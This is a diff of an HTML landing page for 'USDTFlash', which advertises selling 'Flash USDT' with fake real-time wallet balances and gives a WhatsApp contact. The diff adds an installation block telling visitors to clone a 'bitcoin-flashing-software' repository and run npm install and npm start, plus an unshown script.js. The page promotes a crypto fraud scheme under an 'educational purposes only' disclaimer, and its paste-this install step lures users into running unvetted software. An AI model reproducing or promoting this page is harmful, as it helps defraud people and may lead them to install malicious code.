@@ -8,81 +8,7 @@
   <meta name="author" content="USDTFlash" />
   <title>⚡ USDTFlash — Fastest USDT Transfer & Educational Platform</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      font-family: "Inter", sans-serif;
-      background-color: #0f172a;
-      color: #f8fafc;
-      line-height: 1.6;
-    }
-    header {
-      background: linear-gradient(90deg, #06b6d4, #0ea5e9);
-      padding: 1.5rem;
-      text-align: center;
-      color: white;
-    }
-    h1 {
-      font-size: 2rem;
-      margin: 0;
-    }
-    section {
-      max-width: 900px;
-      margin: 2rem auto;
-      padding: 1rem;
-      background: #1e293b;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
-    }
-    h2 {
-      color: #38bdf8;
-      border-bottom: 2px solid #38bdf8;
-      padding-bottom: 5px;
-    }
-    ul {
-      list-style-type: "⚡ ";
-      padding-left: 1.2rem;
-    }
-    a {
-      color: #38bdf8;
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
-    .screenshots img {
-      width: 48%;
-      border-radius: 10px;
-  margin: 1%;
-      transition: transform 0.3s ease;
-    }
-    .screenshots img:hover {
-      transform: scale(1.03);
-    }
-    footer {
-      text-align: center;
-      margin-top: 2rem;
-      padding: 1rem;
-      font-size: 0.9rem;
-      background-color: #0f172a;
-      color: #94a3b8;
-    }
-    .cta {
-      text-align: center;
-      margin-top: 2rem;
-    }
-    .cta a {
-      background: #38bdf8;
-      color: #0f172a;
-      padding: 0.8rem 1.5rem;
-      border-radius: 8px;
-      font-weight: 600;
-      transition: background 0.3s ease;
-    }
-    .cta a:hover {
-      background: #0ea5e9;
-    }
-  </style>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <header>
@@ -93,14 +19,15 @@
   <section>
     <h2>🚀 Features</h2>
     <ul>
-      <li>Instant USDT Transfers across TRC20 & ERC20 networks</li>
+      <li>Instant USDT Transfer across TRC20 & ERC20 networks</li>
       <li>Sell Flash USDT directly and securely</li>
-      <li>Multi-Wallet Compatibility (Binance, Trust Wallet, MetaMask, etc.)</li>
+      <li>Multi-Wallet Compatibility — supports Binance, Trust Wallet, MetaMask, Atomic Wallet, and more</li>
       <li>High-Speed Flash System for real-time balance updates</li>
       <li>Easy Integration with wallets and dApps</li>
     </ul>
   </section>
- <section>
+
+  <section>
     <h2>🪙 Supported Networks</h2>
     <ul>
       <li>TRON (TRC20)</li>
@@ -126,13 +53,25 @@
     <p>💬 WhatsApp: <a href="https://wa.me/+15812424981" target="_blank">+1 581 242 4981</a></p>
   </section>
 
+  <section>
+    <h2>⚙️ Installation</h2>
+    <p>This application requires <a href="https://nodejs.org" target="_blank">Node.js</a> to run.</p>
+    <pre>
+git clone bitcoin-flashing-software/public-release
+npm install && npm install electron
+npm start
+    </pre>
+  </section>
+
   <section class="cta">
     <a href="https://github.com/" target="_blank">⭐ Star this Project on GitHub</a>
   </section>
 
   <footer>
-    <p>⚠️ Disclaimer: For educational and research purposes only. Always follow crypto laws and regulations.</p>
+    <p>⚠️ Disclaimer: This tool is for educational and research purposes only. Always comply with relevant crypto laws.</p>
     <p>© 2025 USDTFlash. All rights reserved.</p>
   </footer>
+
+  <script src="script.js"></script>
 </body>
 </html>
